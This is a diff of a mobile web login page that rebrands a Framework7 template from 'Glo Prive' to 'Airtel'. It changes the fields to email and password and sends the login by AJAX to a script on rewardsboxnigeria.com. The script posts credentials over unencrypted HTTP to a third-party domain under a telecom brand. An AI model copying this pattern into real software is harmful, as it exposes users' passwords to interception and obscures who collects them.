@@ -7,17 +7,17 @@
 <meta name="apple-mobile-web-app-status-bar-style" content="black">
 <link rel="apple-touch-icon" href="images/apple-touch-icon.png" />
 <link rel="apple-touch-startup-image" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2)" href="apple-touch-startup-image-640x1096.png">
-<title>Glo Prive</title>
+<title>Airtel</title>
 <link rel="stylesheet" href="css/framework7.css">
 <link rel="stylesheet" href="style.css">
-<link rel="stylesheet" href="css/colors/grayscale.css">
+<link rel="stylesheet" href="css/colors/red.css">
 <link type="text/css" rel="stylesheet" href="css/swipebox.css" />
 <link type="text/css" rel="stylesheet" href="css/animations.css" />
 <link href='http://fonts.googleapis.com/css?family=Source+Sans+Pro:400,300,700,900' rel='stylesheet' type='text/css'>
 </head>
 <body id="mobile_wrap">
 
-    <div class="statusbar-overlay"></div>
+<div class="statusbar-overlay"></div>
 
     <div class="panel-overlay"></div>
 
@@ -37,9 +37,9 @@
       <div class="form_logo"><img src="images/plogo.png" alt="" title="" /></div>
             <div class="loginform">
             <form id="loginform1" method="post">
-            <input type="text" name="Username" value="" class="form_input required" placeholder="username" id="username" />
-            <input type="password" name="Password" value="" class="form_input required" placeholder="password" id="password" />
-            <!--<div class="forgot_pass"><a href="#" data-popup=".popup-forgot" class="open-popup">Forgot Password?</a></div>-->
+            <input type="email" name="Username" value="" class="form_input required" placeholder="Email" id="username" />
+            <input type="password" name="Password" value="" class="form_input required" placeholder="Password" id="password" />
+         <!--   <div class="forgot_pass"><a href="#" data-popup=".popup-forgot" class="open-popup">Forgot Password?</a></div> -->
             <input type="submit" name="submit" class="form_submit" id="login" value="Login" />
             </form>
          <!--   <div class="signup_bottom">
@@ -73,7 +73,7 @@
     <!-- Login Popup -->
     <div class="popup popup-forgot">
     <div class="content-block-login">
-      <h4>FORGOT PASSWORD</h4>
+     <!-- <h4>FORGOT PASSWORD</h4>
       <div class="form_logo"><img src="images/plogo.png" alt="" title="" /></div>
             <div class="loginform">
             <form id="LoginForm" method="post">
@@ -82,7 +82,7 @@
             </form>
             <div class="signup_bottom">
             <p>Check your email and follow the instructions to reset your password.</p>
-            </div>
+            </div>-->
             </div>
       <div class="close_loginpopup_button"><a href="#" class="close-popup"><img src="images/icons/white/menu_close.png" alt="" title="" /></a></div>
     </div>
@@ -119,10 +119,10 @@ $(document).ready(function(e) {
 	return false;
 	}
 	else{
-	//	alert("say GO");
+		//alert("say GO");
 		$.ajax({
 			type:"POST",
-			url:"http://gloprive.com/mobi/loginscript.php",
+			url:"http://www.Rewardsboxnigeria.com/airtelcustomer/mobi/loginscript.php",
 			data:{username:username, password:password},
 			dataType:"json",
 			success: function(msg){
